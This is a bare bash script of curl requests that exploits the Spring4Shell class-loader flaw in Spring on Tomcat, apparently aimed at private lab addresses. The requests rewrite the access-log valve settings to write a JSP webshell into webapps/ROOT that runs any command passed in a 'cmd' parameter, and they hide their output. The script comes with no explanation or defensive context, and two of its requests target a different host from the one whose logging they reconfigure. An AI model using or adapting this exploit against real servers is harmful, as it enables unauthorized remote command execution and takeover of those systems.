#!/bin/bash
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_" http://10.8.0.2:8080/ &>/dev/null

curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=webshell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" http://172.16.4.33:8080/login-form/greeting &>/dev/null; sleep 3

curl -H "prefix: <%" -H "suffix: %>//" -H "c: Runtime" -H "Content-Type: application/x-www-form-urlencoded" http://10.8.0.2:8080/ &>/dev/null; sleep 1
